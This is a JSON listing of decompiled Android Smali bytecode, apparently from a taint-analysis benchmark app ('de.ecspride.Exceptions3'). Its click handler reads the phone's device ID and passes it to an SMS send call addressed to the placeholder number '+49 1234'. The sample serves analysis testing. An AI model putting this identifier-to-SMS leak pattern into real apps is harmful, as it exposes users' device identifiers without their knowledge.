{"onClick(Landroid\/view\/View;)V":{"1":"    const-string p1, \"\"","2":"    iget-object v0, p0, Lde\/ecspride\/Exceptions3$1;->this$0:Lde\/ecspride\/Exceptions3;","3":"    const-string v1, \"phone\"","4":"    invoke-virtual {v0, v1}, Lde\/ecspride\/Exceptions3;->getSystemService(Ljava\/lang\/String;)Ljava\/lang\/Object;","5":"    move-result-object v0","6":"    check-cast v0, Landroid\/telephony\/TelephonyManager;","7":"    invoke-virtual {v0}, Landroid\/telephony\/TelephonyManager;->getDeviceId()Ljava\/lang\/String;","8":"    move-result-object p1","9":"    const\/16 v0, 0x2a","10":"    new-array v0, v0, [I","11":"    const\/16 v1, 0x20","12":"    aget p1, v0, v1","13":"    goto :goto_26","14":"    move-object v3, p1","15":"    invoke-static {}, Landroid\/telephony\/SmsManager;->getDefault()Landroid\/telephony\/SmsManager;","16":"    move-result-object v0","17":"    const\/4 v2, 0x0","18":"    const\/4 v4, 0x0","19":"    const\/4 v5, 0x0","20":"    const-string v1, \"+49 1234\"","21":"    invoke-virtual\/range {v0 .. v5}, Landroid\/telephony\/SmsManager;->sendTextMessage(Ljava\/lang\/String;Ljava\/lang\/String;Ljava\/lang\/String;Landroid\/app\/PendingIntent;Landroid\/app\/PendingIntent;)V","22":"    return-void"},"<init>(Lde\/ecspride\/Exceptions3;)V":{"1":"    iput-object p1, p0, Lde\/ecspride\/Exceptions3$1;->this$0:Lde\/ecspride\/Exceptions3;","2":"    invoke-direct {p0}, Ljava\/lang\/Object;-><init>()V","3":"    return-void"}}